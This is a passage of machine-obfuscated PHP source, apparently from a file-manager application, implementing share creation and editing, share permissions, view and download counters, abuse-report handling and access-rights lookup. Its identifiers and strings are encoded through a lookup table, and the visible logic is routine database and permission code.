listToMe($ÖŒŸùš = 300) { $Áû„÷½’ =& $_SERVER[´È¥ö†ö]; $Î¥œåõ = Model($Áû„÷½’[2126])->userGroupParents(USER_ID); $å¹Ã­¡» = array($Áû„÷½’[662] => SourceModel::TYPE_USER, $Áû„÷½’[580] => USER_ID); if ($Î¥œåõ) { $å¹Ã­¡» = array(array($Áû„÷½’[662] => SourceModel::TYPE_USER, $Áû„÷½’[580] => USER_ID), array($Áû„÷½’[662] => SourceModel::TYPE_GROUP, $Áû„÷½’[580] => array($Áû„÷½’[7], $Î¥œåõ)), $Áû„÷½’[2124] => $Áû„÷½’[2076]); } $ãÕŸ—¢¶ = Model($Áû„÷½’[680])->where($å¹Ã­¡»)->selectPage($ÖŒŸùš); $ùŠ‚ãù· = array_to_keyvalue_group($ãÕŸ—¢¶[$Áû„÷½’[456]], $Áû„÷½’[679]); if (!$ùŠ‚ãù·) { return $ãÕŸ—¢¶; } $û÷â‚”× = $Áû„÷½’[2127]; $å¹Ã­¡» = array($Áû„÷½’[679] => array($Áû„÷½’[503], array_keys($ùŠ‚ãù·)), $Áû„÷½’[1773] => array($Áû„÷½’[1090], $Áû„÷½’[230])); $€Ğö¯†Ò = $this->field($û÷â‚”×)->where($å¹Ã­¡»)->select(); foreach ($€Ğö¯†Ò as $ğ•Å±¥ => &$äİ©Æóö) { $äİ©Æóö[$Áû„÷½’[2123]] = $ùŠ‚ãù·[$äİ©Æóö[$Áû„÷½’[679]]]; } unset($äİ©Æóö); $ÃÎé³¥ = array($Áû„÷½’[2128] => $€Ğö¯†Ò, $Áû„÷½’[2129] => $ãÕŸ—¢¶[$Áû„÷½’[453]]); return $ÃÎé³¥; } protected function shareAdd($åÕï¤, $çË€—ç) { $™ìøôĞ¬ =& $_SERVER[´È¥ö†ö]; $Ì ş­Ïù = $this->_addShareData($åÕï¤, $çË€—ç); if (!empty($çË€—ç[$™ìøôĞ¬[2130]])) { $this->_shareAuthSet($Ì ş­Ïù, $çË€—ç[$™ìøôĞ¬[2130]]); } $this->shareEventAdd($åÕï¤, $çË€—ç, $™ìøôĞ¬[2131]); return $Ì ş­Ïù; } protected function shareAddSystem($ªÁûà‘¹, $óÙˆğ–¢) { $¶òøãš  =& $_SERVER[´È¥ö†ö]; $µÕŒñÓ“ = $this->_addShareData($ªÁûà‘¹, $óÙˆğ–¢, $¶òøãš [191]); $this->_shareAuthSet($µÕŒñÓ“, $óÙˆğ–¢[$¶òøãš [2130]]); return $µÕŒñÓ“; } private function shareEventAdd($«ÀÊÏà‹, $íğëç , $İ­ëÂ = "\x61\x64\x64") { $İöÍ¾ =& $_SERVER[´È¥ö†ö]; if (!$«ÀÊÏà‹ || $«ÀÊÏà‹ == $İöÍ¾[230]) { return; } if ($İ­ëÂ == $İöÍ¾[2131]) { if ($íğëç [$İöÍ¾[573]] == $İöÍ¾[91]) { Model($İöÍ¾[647])->eventShare($«ÀÊÏà‹, $İöÍ¾[2132]); } if ($íğëç [$İöÍ¾[677]] == $İöÍ¾[91]) { Model($İöÍ¾[647])->eventShare($«ÀÊÏà‹, $İöÍ¾[2133]); } return; } $ù”Å¶„ = $this->getInfoByPath($«ÀÊÏà‹); $ÙœíÙÙ· = $İöÍ¾[2134]; if ($ù”Å¶„[$İöÍ¾[573]] == $İöÍ¾[230] && $íğëç [$İöÍ¾[573]] == $İöÍ¾[91]) { $ÙœíÙÙ· = $İöÍ¾[2132]; } if ($ù”Å¶„[$İöÍ¾[573]] == $İöÍ¾[91] && $íğëç [$İöÍ¾[573]] == $İöÍ¾[230]) { $ÙœíÙÙ· = $İöÍ¾[2135]; } if ($ù”Å¶„[$İöÍ¾[677]] == $İöÍ¾[230] && $íğëç [$İöÍ¾[677]] == $İöÍ¾[91]) { $ÙœíÙÙ· = $İöÍ¾[2133]; } if ($ù”Å¶„[$İöÍ¾[677]] == $İöÍ¾[91] && $íğëç [$İöÍ¾[677]] == $İöÍ¾[230]) { $ÙœíÙÙ· = $İöÍ¾[2136]; } Model($İöÍ¾[647])->eventShare($«ÀÊÏà‹, $ÙœíÙÙ·); return; } private function _addShareData($ß“üö¤Ì, $´å‘İÆ™ = array(), $ùâõª’ö = false) { $Ïô½À§º =& $_SERVER[´È¥ö†ö]; $îÊ Š’¼ = $ùâõª’ö == $Ïô½À§º[191] ? 0 : USER_ID; $é™ßÚ = array($Ïô½À§º[502] => $ß“üö¤Ì, $Ïô½À§º[1764] => $îÊ Š’¼); if ($ß“üö¤Ì == 0) { $é™ßÚ = array($Ïô½À§º[2137] => $´å‘İÆ™[$Ïô½À§º[1256]], $Ïô½À§º[1764] => $îÊ Š’¼); } if ($—•±‰îŠ = $this->where($é™ßÚ)->find()) { return $—•±‰îŠ[$Ïô½À§º[679]]; } if ($ß“üö¤Ì == 0) { $ÎâÕÄÇÅ = array($Ïô½À§º[32] => get_path_this($´å‘İÆ™[$Ïô½À§º[87]])); } else { $ÎâÕÄÇÅ = Model($Ïô½À§º[901])->sourceInfo($ß“üö¤Ì); if (!$ÎâÕÄÇÅ) { return !1; } } if (!$´å‘İÆ™[$Ïô½À§º[1659]]) { $´å‘İÆ™[$Ïô½À§º[1659]] = $ÎâÕÄÇÅ[$Ïô½À§º[32]]; } $À¤ıä« = array($Ïô½À§º[1764] => $îÊ Š’¼, $Ïô½À§º[502] => $ß“üö¤Ì, $Ïô½À§º[1659] => $Ïô½À§º[12], $Ïô½À§º[573] => 0, $Ïô½À§º[677] => 0, $Ïô½À§º[1256] => $Ïô½À§º[12], $Ïô½À§º[393] => $Ïô½À§º[12], $Ïô½À§º[965] => $Ïô½À§º[12], $Ïô½À§º[2138] => 0, $Ïô½À§º[2139] => 0, $Ïô½À§º[837] => 0, $Ïô½À§º[2140] => $Ïô½À§º[12], $Ïô½À§º[2121] => $Ïô½À§º[12]); $Ò¸çƒèá = explode($Ïô½À§º[50], $Ïô½À§º[2141]); foreach ($Ò¸çƒèá as $ğà¾¿ò§) { if (!isset($´å‘İÆ™[$ğà¾¿ò§])) { continue; } $À¤ıä«[$ğà¾¿ò§] = $´å‘İÆ™[$ğà¾¿ò§]; } $Şâ¸¿æğ = $this->add($À¤ıä«); $ıÀ½ıšÍ = array($Ïô½À§º[2121] => short_id($Şâ¸¿æğ)); $this->where(array($Ïô½À§º[2142] => $Şâ¸¿æğ))->save($ıÀ½ıšÍ); return $Şâ¸¿æğ; } private function _shareAuthSet($Šº‹Á€œ, $ì«¹Å‰Ò) { $²å™Ç¥ =& $_SERVER[´È¥ö†ö]; if (!is_array($ì«¹Å‰Ò)) { return !1; } $Äò®€Á… = Model($²å™Ç¥[2086]); $Äò®€Á…->where(array($²å™Ç¥[679] => $Šº‹Á€œ))->delete(); $ÂÒù’¬İ = array(); foreach ($ì«¹Å‰Ò as $›§’¢Ö) { $Ê«ìŠÜ = SourceModel::TYPE_USER; if ($›§’¢Ö[$²å™Ç¥[190]] == SourceModel::TYPE_GROUP) { $Ê«ìŠÜ = SourceModel::TYPE_GROUP; } $ŠŒì Ä = array($²å™Ç¥[679] => $Šº‹Á€œ, $²å™Ç¥[190] => $Ê«ìŠÜ, $²å™Ç¥[580] => intval($›§’¢Ö[$²å™Ç¥[580]]), $²å™Ç¥[2082] => 0, $²å™Ç¥[2143] => -1); if ($›§’¢Ö[$²å™Ç¥[2082]]) { $ŠŒì Ä[$²å™Ç¥[2082]] = $›§’¢Ö[$²å™Ç¥[2082]]; } else { if ($›§’¢Ö[$²å™Ç¥[2143]]) { $ŠŒì Ä[$²å™Ç¥[2143]] = $›§’¢Ö[$²å™Ç¥[2143]]; } } $ÂÒù’¬İ[] = $ŠŒì Ä; } return $Äò®€Á…->addAll($ÂÒù’¬İ, array(), !0); } public function numViewAdd($˜ÑÃ¶ĞÇ) { $Ô™àıöä =& $_SERVER[´È¥ö†ö]; $‘ğ†»Ñ¸ = array($Ô™àıöä[2142] => $˜ÑÃ¶ĞÇ); $this->where($‘ğ†»Ñ¸)->setAdd($Ô™àıöä[2138]); } public function numDownloadAdd($Œšñæ€¤) { $«ùÉ¨­ =& $_SERVER[´È¥ö†ö]; $×¢Û™°× = array($«ùÉ¨­[2142] => $Œšñæ€¤); $this->where($×¢Û™°×)->setAdd($«ùÉ¨­[2139]); } protected function shareEdit($úÒü£‘·, $•ƒİµè) { $±ªı¶®Ï =& $_SERVER[´È¥ö†ö]; $èÈıˆ¤´ = $this->getInfo($úÒü£‘·); if (!$èÈıˆ¤´) { return !1; } $this->_checkLinkShare($•ƒİµè, $èÈıˆ¤´); $…€š¼Îù = array(); $ÈÓ‘ë§Ü = explode($±ªı¶®Ï[50], $±ªı¶®Ï[2144]); foreach ($ÈÓ‘ë§Ü as $öàËİ„) { if (!array_key_exists($öàËİ„, $•ƒİµè)) { continue; } $…€š¼Îù[$öàËİ„] = $•ƒİµè[$öàËİ„]; } $this->shareEventAdd($èÈıˆ¤´[$±ªı¶®Ï[193]], $•ƒİµè, $±ªı¶®Ï[1943]); $this->where(array($±ªı¶®Ï[2142] => $úÒü£‘·))->save($…€š¼Îù); if (isset($•ƒİµè[$±ªı¶®Ï[2130]])) { $this->_shareAuthSet($úÒü£‘·, $•ƒİµè[$±ªı¶®Ï[2130]]); } return !0; } private function _checkLinkShare($­å¶Æ„€, $óËÊéüö) { $İŞÑıŸå =& $_SERVER[´È¥ö†ö]; if ($­å¶Æ„€[$İŞÑıŸå[573]] != $İŞÑıŸå[91]) { return; } $€«ˆÏ²ç = $óËÊéüö[$İŞÑıŸå[90]][$İŞÑıŸå[193]]; if ($óËÊéüö[$İŞÑıŸå[90]][$İŞÑıŸå[33]] != $İŞÑıŸå[232]) { $Ä€²ê¦æ = $this->_folderReport($€«ˆÏ²ç); if (!$Ä€²ê¦æ) { return; } show_json(LNG($İŞÑıŸå[2145]) . $İŞÑıŸå[2146] . $Ä€²ê¦æ, !1); } $©ŒÖ Ä = Model($İŞÑıŸå[901])->fileInfoGet($óËÊéüö[$İŞÑıŸå[90]][$İŞÑıŸå[193]]); if (!$©ŒÖ Ä) { return; } $¼íë„Í– = $this->shareFileMeta($©ŒÖ Ä[$İŞÑıŸå[552]]); if (isset($¼íë„Í–[$İŞÑıŸå[461]]) && $¼íë„Í–[$İŞÑıŸå[461]] == $İŞÑıŸå[91]) { show_json(LNG($İŞÑıŸå[2147]), !1); } } private function _folderReport($üŒ¾ãÓì) { $Ò¹‡˜¡Û =& $_SERVER[´È¥ö†ö]; $Âõğ¶‚ = array($Ò¹‡˜¡Û[552] => array($Ò¹‡˜¡Û[1088], 0), $Ò¹‡˜¡Û[826] => 3); $Çà™¬í = Model($Ò¹‡˜¡Û[2148])->where($Âõğ¶‚)->field($Ò¹‡˜¡Û[552])->select(); if (!$Çà™¬í) { return !1; } $Çà™¬í = array_to_keyvalue($Çà™¬í, $Ò¹‡˜¡Û[12], $Ò¹‡˜¡Û[552]); $öŠŞ”¬¢ = $Ò¹‡˜¡Û[50] . $üŒ¾ãÓì . $Ò¹‡˜¡Û[50]; $Âõğ¶‚ = array($Ò¹‡˜¡Û[552] => array($Ò¹‡˜¡Û[7], $Çà™¬í), $Ò¹‡˜¡Û[595] => array($Ò¹‡˜¡Û[470], "\x25{$öŠŞ”¬¢}\x25"), $Ò¹‡˜¡Û[516] => 0); $ƒÜÓºš = Model($Ò¹‡˜¡Û[901])->where($Âõğ¶‚)->field($Ò¹‡˜¡Û[2149])->find(); if (!$ƒÜÓºš) { return !1; } $šˆÀŸüô = substr($ƒÜÓºš[$Ò¹‡˜¡Û[595]], strpos($ƒÜÓºš[$Ò¹‡˜¡Û[595]], $öŠŞ”¬¢)); $Âõğ¶‚ = array($Ò¹‡˜¡Û[193] => array($Ò¹‡˜¡Û[7], trim($šˆÀŸüô, $Ò¹‡˜¡Û[50]))); $»µ¡ªÁ‚ = Model($Ò¹‡˜¡Û[901])->where($Âõğ¶‚)->field($Ò¹‡˜¡Û[32])->select(); $Ä½§äŠª = array_to_keyvalue($»µ¡ªÁ‚, $Ò¹‡˜¡Û[12], $Ò¹‡˜¡Û[32]); $Ä½§äŠª[] = $ƒÜÓºš[$Ò¹‡˜¡Û[32]]; return implode($Ò¹‡˜¡Û[8], $Ä½§äŠª); } protected function remove($Öšªù†å) { $Ø©ó¬À° =& $_SERVER[´È¥ö†ö]; $£İÑ÷³á = is_array($Öšªù†å) ? $Öšªù†å : array($Öšªù†å); for ($Ê”çÀô = 0; $Ê”çÀô < count($£İÑ÷³á); $Ê”çÀô++) { $Í×æª†ê = $this->getInfo($£İÑ÷³á[$Ê”çÀô]); if ($Í×æª†ê[$Ø©ó¬À°[677]] == $Ø©ó¬À°[91]) { Model($Ø©ó¬À°[647])->eventShare($Í×æª†ê[$Ø©ó¬À°[193]], $Ø©ó¬À°[2136]); } if ($Í×æª†ê[$Ø©ó¬À°[573]] == $Ø©ó¬À°[91]) { Model($Ø©ó¬À°[647])->eventShare($Í×æª†ê[$Ø©ó¬À°[193]], $Ø©ó¬À°[2135]); } } if (is_array($Öšªù†å)) { $Öšªù†å = array($Ø©ó¬À°[7], $Öšªù†å); } $ŸÕŒà‰³ = array($Ø©ó¬À°[679] => $Öšªù†å); $úàæ = $this->where($ŸÕŒà‰³)->delete(); if ($úàæ) { Model($Ø©ó¬À°[680])->where(array($Ø©ó¬À°[679] => $Öšªù†å))->delete(); } return $úàæ; } protected function removeBySource($£’’•Ê¤) { $èéïï¶ú =& $_SERVER[´È¥ö†ö]; $íÉÙ›Ä£ = array($èéïï¶ú[502] => array($èéïï¶ú[503], $£’’•Ê¤)); $‹¡ÆˆÍ = $this->field($èéïï¶ú[679])->where($íÉÙ›Ä£)->select(); $‹¡ÆˆÍ = array_to_keyvalue($‹¡ÆˆÍ, $èéïï¶ú[12], $èéïï¶ú[679]); if (!$‹¡ÆˆÍ) { return; } $íÉÙ›Ä£ = array($èéïï¶ú[2142] => array($èéïï¶ú[503], $‹¡ÆˆÍ)); $this->where($íÉÙ›Ä£)->delete(); Model($èéïï¶ú[680])->where($íÉÙ›Ä£)->delete(); } public function listAll($Ã‹ùÃÎµ) { $ÂäèÙŠß =& $_SERVER[´È¥ö†ö]; $€ä¶Éæ = array(); if ($Ã‹ùÃÎµ[$ÂäèÙŠß[1773]]) { $€ä¶Éæ[$ÂäèÙŠß[1773]] = $Ã‹ùÃÎµ[$ÂäèÙŠß[1773]]; } if ($Ã‹ùÃÎµ[$ÂäèÙŠß[836]]) { $¾Ó÷â‰ = $Ã‹ùÃÎµ[$ÂäèÙŠß[837]] ? $Ã‹ùÃÎµ[$ÂäèÙŠß[837]] : strtotime(date($ÂäèÙŠß[2150])); $€ä¶Éæ[$ÂäèÙŠß[233]] = array($ÂäèÙŠß[419], array($Ã‹ùÃÎµ[$ÂäèÙŠß[836]], $¾Ó÷â‰)); } if ($Ã‹ùÃÎµ[$ÂäèÙŠß[33]]) { $€ä¶Éæ[$Ã‹ùÃÎµ[$ÂäèÙŠß[33]]] = 1; } else { $€ä¶Éæ[] = array($ÂäèÙŠß[573] => array($ÂäèÙŠß[1088], 0), $ÂäèÙŠß[677] => array($ÂäèÙŠß[1088], 0), $ÂäèÙŠß[2124] => $ÂäèÙŠß[2076]); } if ($Ã‹ùÃÎµ[$ÂäèÙŠß[2072]]) { $€ä¶Éæ[] = array($ÂäèÙŠß[2121] => $Ã‹ùÃÎµ[$ÂäèÙŠß[2072]], $ÂäèÙŠß[1659] => array($ÂäèÙŠß[470], "\x25{$Ã‹ùÃÎµ[$ÂäèÙŠß[2072]]}\x25"), $ÂäèÙŠß[2124] => $ÂäèÙŠß[2076]); } $•õî“³ø = $this->_makeOrder()->where($€ä¶Éæ)->selectPage(20); if (empty($•õî“³ø[$ÂäèÙŠß[456]])) { return array(); } $this->_listDataApply($•õî“³ø[$ÂäèÙŠß[456]]); return $•õî“³ø; } public function listDataApply($«Œ¿ßº) { $this->_listDataApply($«Œ¿ßº); return $«Œ¿ßº; } private function _listDataApply(&$›†’•„…) { $æÙâ¥Ø¤ =& $_SERVER[´È¥ö†ö]; $®­Ó¼³Ü = array_to_keyvalue($›†’•„…, $æÙâ¥Ø¤[12], $æÙâ¥Ø¤[1773]); $¿¿Ş©öÎ = Model($æÙâ¥Ø¤[608])->userListInfo(array_unique($®­Ó¼³Ü)); $†ê×Š’ = array_to_keyvalue($›†’•„…, $æÙâ¥Ø¤[12], $æÙâ¥Ø¤[193]); $º– û = Model($æÙâ¥Ø¤[901])->sourceListInfo($†ê×Š’, !0); foreach ($›†’•„… as $•µãÇû => &$¶ÑúÄŞ¡) { $¬„Ù†ˆ¼ = $¶ÑúÄŞ¡[$æÙâ¥Ø¤[1773]]; $¶ÑúÄŞ¡[$æÙâ¥Ø¤[2151]] = $¿¿Ş©öÎ[$¬„Ù†ˆ¼] ? $¿¿Ş©öÎ[$¬„Ù†ˆ¼] : !1; $ä¹ñè = $¶ÑúÄŞ¡[$æÙâ¥Ø¤[193]]; $¶ÑúÄŞ¡[$æÙâ¥Ø¤[90]] = $º– û[$ä¹ñè] ? $º– û[$ä¹ñè] : !1; if ($¶ÑúÄŞ¡[$æÙâ¥Ø¤[90]][$æÙâ¥Ø¤[516]] == $æÙâ¥Ø¤[91]) { unset($›†’•„…[$•µãÇû]); } if ($¶ÑúÄŞ¡[$æÙâ¥Ø¤[90]] != $æÙâ¥Ø¤[230] && !$¶ÑúÄŞ¡[$æÙâ¥Ø¤[90]]) { unset($›†’•„…[$•µãÇû]); } } unset($¶ÑúÄŞ¡); $›†’•„… = array_values($›†’•„…); } private function _makeOrder($ËÏç°Ôƒ = '') { $Í…ıä‹â =& $_SERVER[´È¥ö†ö]; $Œ£¿Øíš = array($Í…ıä‹â[233], $Í…ıä‹â[837], $Í…ıä‹â[2138], $Í…ıä‹â[2139]); $ÒŸµßŠ = array($Í…ıä‹â[534] => $Í…ıä‹â[535], $Í…ıä‹â[536] => $Í…ıä‹â[537]); $õ—¥À¼´ = Input::get($Í…ıä‹â[541], $Í…ıä‹â[7], $Í…ıä‹â[508], $Œ£¿Øíš); $Øš³©Ò = Input::get($Í…ıä‹â[542], $Í…ıä‹â[7], $Í…ıä‹â[2152], array($Í…ıä‹â[2069], $Í…ıä‹â[536])); $Øš³©Ò = $ÒŸµßŠ[$Øš³©Ò]; $ËÏç°Ôƒ = $ËÏç°Ôƒ . "{$õ—¥À¼´}\x20{$Øš³©Ò}"; return $this->order($ËÏç°Ôƒ); } public function reportAdd($äú–òĞÍ) { $¡ù©èø­ =& $_SERVER[´È¥ö†ö]; $«ßÒ­Ùï = array($¡ù©èø­[679] => $äú–òĞÍ[$¡ù©èø­[679]], $¡ù©èø­[1773] => USER_ID); if (Model($¡ù©èø­[2148])->where($«ßÒ­Ùï)->find()) { return !1; } $ƒóµøçÀ = array($¡ù©èø­[679] => $äú–òĞÍ[$¡ù©èø­[679]], $¡ù©èø­[1659] => $äú–òĞÍ[$¡ù©èø­[1659]], $¡ù©èø­[193] => $äú–òĞÍ[$¡ù©èø­[193]], $¡ù©èø­[552] => $äú–òĞÍ[$¡ù©èø­[552]], $¡ù©èø­[1773] => USER_ID, $¡ù©èø­[33] => $äú–òĞÍ[$¡ù©èø­[33]], $¡ù©èø­[537] => $äú–òĞÍ[$¡ù©èø­[537]]); return Model($¡ù©èø­[2148])->add($ƒóµøçÀ); } public function reportList($¥ı×ê¼¡) { $ÕÁ¡ÂÆü =& $_SERVER[´È¥ö†ö]; $á°—ÌåØ = array(); if ($¥ı×ê¼¡[$ÕÁ¡ÂÆü[836]]) { $õµÊ£¶ê = $¥ı×ê¼¡[$ÕÁ¡ÂÆü[837]] ? $¥ı×ê¼¡[$ÕÁ¡ÂÆü[837]] : strtotime(date($ÕÁ¡ÂÆü[2150])); $á°—ÌåØ[$ÕÁ¡ÂÆü[233]] = array($ÕÁ¡ÂÆü[419], array($¥ı×ê¼¡[$ÕÁ¡ÂÆü[836]], $õµÊ£¶ê)); } if (isset($¥ı×ê¼¡[$ÕÁ¡ÂÆü[33]]) && in_array($¥ı×ê¼¡[$ÕÁ¡ÂÆü[33]], array($ÕÁ¡ÂÆü[91], $ÕÁ¡ÂÆü[521], $ÕÁ¡ÂÆü[2153], $ÕÁ¡ÂÆü[2154], $ÕÁ¡ÂÆü[2155]))) { $á°—ÌåØ[$ÕÁ¡ÂÆü[33]] = $¥ı×ê¼¡[$ÕÁ¡ÂÆü[33]]; } if (isset($¥ı×ê¼¡[$ÕÁ¡ÂÆü[826]]) && in_array($¥ı×ê¼¡[$ÕÁ¡ÂÆü[826]], array($ÕÁ¡ÂÆü[230], $ÕÁ¡ÂÆü[91], $ÕÁ¡ÂÆü[521], $ÕÁ¡ÂÆü[2153]))) { $á°—ÌåØ[$ÕÁ¡ÂÆü[826]] = $¥ı×ê¼¡[$ÕÁ¡ÂÆü[826]]; } $ôñ˜÷ôö = Input::get($ÕÁ¡ÂÆü[542], $ÕÁ¡ÂÆü[7], $ÕÁ¡ÂÆü[2152], array($ÕÁ¡ÂÆü[2069], $ÕÁ¡ÂÆü[536])); $Œã…ıÄò = array($ÕÁ¡ÂÆü[534] => $ÕÁ¡ÂÆü[535], $ÕÁ¡ÂÆü[536] => $ÕÁ¡ÂÆü[537]); $›ßÅü½ = $ÕÁ¡ÂÆü[2156] . $Œã…ıÄò[$ôñ˜÷ôö]; $ê­®Ùøº = Model($ÕÁ¡ÂÆü[2148])->where($á°—ÌåØ)->order($›ßÅü½)->selectPage(20); if (empty($ê­®Ùøº[$ÕÁ¡ÂÆü[456]])) { return array(); } $‘ó¾ÉÛÌ = array_to_keyvalue_group($ê­®Ùøº[$ÕÁ¡ÂÆü[456]], $ÕÁ¡ÂÆü[826], $ÕÁ¡ÂÆü[679]); if (!empty($‘ó¾ÉÛÌ[0])) { $¥ı×ê¼¡ = $‘ó¾ÉÛÌ[0]; $á°—ÌåØ = array($ÕÁ¡ÂÆü[679] => array($ÕÁ¡ÂÆü[7], $¥ı×ê¼¡)); $–İ–Òã° = $this->where($á°—ÌåØ)->field($ÕÁ¡ÂÆü[679])->select(); $–İ–Òã° = array_to_keyvalue($–İ–Òã°, $ÕÁ¡ÂÆü[12], $ÕÁ¡ÂÆü[679]); $óºû÷­’ = array_diff($¥ı×ê¼¡, $–İ–Òã°); if (!empty($óºû÷­’)) { foreach ($ê­®Ùøº[$ÕÁ¡ÂÆü[456]] as $ˆØ€¤ŠŞ => $Çß‘Õ¦) { if (in_array($Çß‘Õ¦[$ÕÁ¡ÂÆü[679]], $óºû÷­’)) { unset($ê­®Ùøº[$ÕÁ¡ÂÆü[456]][$ˆØ€¤ŠŞ]); } } } } $this->_listDataApply($ê­®Ùøº[$ÕÁ¡ÂÆü[456]]); return $ê­®Ùøº; } public function reportStatus($–ÍŸì¾Û) { $Îâˆ§á =& $_SERVER[´È¥ö†ö]; $Ê¹Æúò = array($Îâˆ§á[486] => $–ÍŸì¾Û[$Îâˆ§á[486]]); $Ñ÷˜Ÿå = Model($Îâˆ§á[2148])->where($Ê¹Æúò)->field($Îâˆ§á[2157])->find(); if (!$Ñ÷˜Ÿå) { return !1; } $ŒÎâªÍ = array($Îâˆ§á[826] => $–ÍŸì¾Û[$Îâˆ§á[826]]); if ($–ÍŸì¾Û[$Îâˆ§á[826]] == $Îâˆ§á[2153] && $Ñ÷˜Ÿå[$Îâˆ§á[826]] == $Îâˆ§á[2153]) { $ŒÎâªÍ[$Îâˆ§á[826]] = 0; } $‹¯Ş×ª– = Model($Îâˆ§á[2148])->where($Ê¹Æúò)->save($ŒÎâªÍ); if ($–ÍŸì¾Û[$Îâˆ§á[826]] == $Îâˆ§á[521]) { if ($Ñ÷˜Ÿå[$Îâˆ§á[552]] != $Îâˆ§á[230] && $this->shareFileMeta($Ñ÷˜Ÿå[$Îâˆ§á[552]])) { $this->shareFileMeta($Ñ÷˜Ÿå[$Îâˆ§á[552]], 0); } $this->remove($Ñ÷˜Ÿå[$Îâˆ§á[679]]); return !0; } if ($‹¯Ş×ª– && $–ÍŸì¾Û[$Îâˆ§á[826]] == $Îâˆ§á[2153]) { $Â¾´‡¥ = $ŒÎâªÍ[$Îâˆ§á[826]] == $Îâˆ§á[2153] ? 1 : 0; $this->shareFileMeta($Ñ÷˜Ÿå[$Îâˆ§á[552]], $Â¾´‡¥); $this->removeByFile($Ñ÷˜Ÿå[$Îâˆ§á[552]]); } return $‹¯Ş×ª–; } private function removeByFile($ï¯²µİ®) { $â±ó„¶ =& $_SERVER[´È¥ö†ö]; $È»èÁóİ = Model($â±ó„¶[901])->where(array($â±ó„¶[552] => $ï¯²µİ®))->field($â±ó„¶[193])->select(); $À³à´Ôà = array_to_keyvalue($È»èÁóİ, $â±ó„¶[12], $â±ó„¶[193]); $–øéˆ¦ = array($â±ó„¶[193] => array($â±ó„¶[7], $À³à´Ôà), $â±ó„¶[573] => 1); $È»èÁóİ = $this->where($–øéˆ¦)->field($â±ó„¶[679])->select(); if (empty($È»èÁóİ)) { return; } $°™¥‡ÆÁ = array_to_keyvalue($È»èÁóİ, $â±ó„¶[12], $â±ó„¶[679]); $this->remove($°™¥‡ÆÁ); } private function shareFileMeta($Š¦¹Íê, $¡ô¨ø›€ = null) { $ƒ˜†ôÚ´ =& $_SERVER[´È¥ö†ö]; $ƒ¹Ğ÷ıî = array($ƒ˜†ôÚ´[552] => $Š¦¹Íê, $ƒ˜†ôÚ´[97] => $ƒ˜†ôÚ´[2158]); if (is_null($¡ô¨ø›€)) { return Model($ƒ˜†ôÚ´[2159])->where($ƒ¹Ğ÷ıî)->find(); } $ƒ¹Ğ÷ıî[$ƒ˜†ôÚ´[461]] = $¡ô¨ø›€; Model($ƒ˜†ôÚ´[2159])->add($ƒ¹Ğ÷ıî, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\x69\x6f\137\163\x6f\165\162\x63\x65\x5f\x61\165\164\150"; public function getAuth($—êà¿ŞÒ) { $˜Ñ»æ =& $_SERVER[´È¥ö†ö]; $’ãœÎ¥ = $this->sourceAuthSelect($—êà¿ŞÒ); $øßşª­ = array(); $°¸ñ·‹± = array(); $»êë“Ö = 2 << 25; foreach ($’ãœÎ¥ as $şøã³£É) { $âœ¥…íÎ = Model($˜Ñ»æ[582])->listData($şøã³£É[$˜Ñ»æ[2082]]); if (!$âœ¥…íÎ) { continue; } $øßşª­[] = $şøã³£É; $şçä£´û = 0; if ($şøã³£É[$˜Ñ»æ[190]] == SourceModel::TYPE_GROUP) { $şçä£´û = $»êë“Ö * 2; } if ($şøã³£É[$˜Ñ»æ[190]] == SourceModel::TYPE_USER) { $şçä£´û = $»êë“Ö; } if ($şøã³£É[$˜Ñ»æ[190]] == SourceModel::TYPE_USER && $şøã³£É[$˜Ñ»æ[580]] == $˜Ñ»æ[230]) { $şçä£´û = 0; } $°¸ñ·‹±[] = $âœ¥…íÎ[$˜Ñ»æ[498]] + $şçä£´û; } array_multisort($°¸ñ·‹±, SORT_DESC, $øßşª­); return $øßşª­; } public function sourceAuthSelect($ó¼Ï“Â) { $ˆú¬ìÆ =& $_SERVER[´È¥ö†ö]; static $ÒƒÆÃá = array(); $µ‰«Ó ½ = is_array($ó¼Ï“Â) ? !1 : !0; if ($µ‰«Ó ½) { $ó¼Ï“Â = array($ó¼Ï“Â); } $…üÌ„ïú = array(); foreach ($ó¼Ï“Â as $äêåœĞ) { if (isset($ÒƒÆÃá[$äêåœĞ])) { $…üÌ„ïú[$äêåœĞ] = $ÒƒÆÃá[$äêåœĞ]; } } if (count($…üÌ„ïú) == count($ó¼Ï“Â)) { return $µ‰«Ó ½ ? $…üÌ„ïú[$ó¼Ï“Â[0]] : $…üÌ„ïú; } $·öŠãŸô = $ˆú¬ìÆ[2160]; $İ¥åˆ€• = array($ˆú¬ìÆ[193] => array($ˆú¬ìÆ[7], $ó¼Ï“Â)); $ÖœúãÒ˜ = $this->field($·öŠãŸô)->order($ˆú¬ìÆ[486])->where($İ¥åˆ€•)->select(); $ÈßÔºíÆ = array_to_keyvalue_group($ÖœúãÒ˜, $ˆú¬ìÆ[193]); foreach ($ó¼Ï“Â as $äêåœĞ) { $ÒƒÆÃá[$äêåœĞ] = $ÈßÔºíÆ[$äêåœĞ] ? $ÈßÔºíÆ[$äêåœĞ] : array(); } if ($µ‰«Ó ½) { return $ÖœúãÒ˜; } return $ÈßÔºíÆ; } public function setAuth($¥çŒüë“, $ÅÂ„í) { $ñù¸°Éù =& $_SERVER[´È¥ö†ö]; $ˆŒîò«è = Model($ñù¸°Éù[1420])->sourceInfo($¥çŒüë“); if (!$ˆŒîò«è) { return !1; } if ($ˆŒîò«è[$ñù¸°Éù[190]] != SourceModel::TYPE_GROUP) { return !1; } $şí¿üı™ = 1; $·ÃÔåÁ = $ˆŒîò«è[$ñù¸°Éù[580]]; if ($·ÃÔåÁ != $şí¿üı™) { $£‰¤ó­Ó = array($ñù¸°Éù[1974] => $·ÃÔåÁ); $ÉÆÉ®İô = Model($ñù¸°Éù[2068])->field($ñù¸°Éù[1773])->where($£‰¤ó­Ó)->select(); $ÉÆÉ®İô = array_to_keyvalue($ÉÆÉ®İô, $ñù¸°Éù[12], $ñù¸°Éù[1773]); } $À¶ËÈÅÓ = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $¶‡ÓÌ¯¡ = array(); foreach ($ÅÂ„í as $™¡íêªí) { if (!in_array($™¡íêªí[$ñù¸°Éù[190]], $À¶ËÈÅÓ)) { show_json(LNG($ñù¸°Éù[2161]), !1); } if ($·ÃÔåÁ != $şí¿üı™) { if ($™¡íêªí[$ñù¸°Éù[190]] == SourceModel::TYPE_GROUP) { } if ($™¡íêªí[$ñù¸°Éù[580]] != 0 && !in_array($™¡íêªí[$ñù¸°Éù[580]], 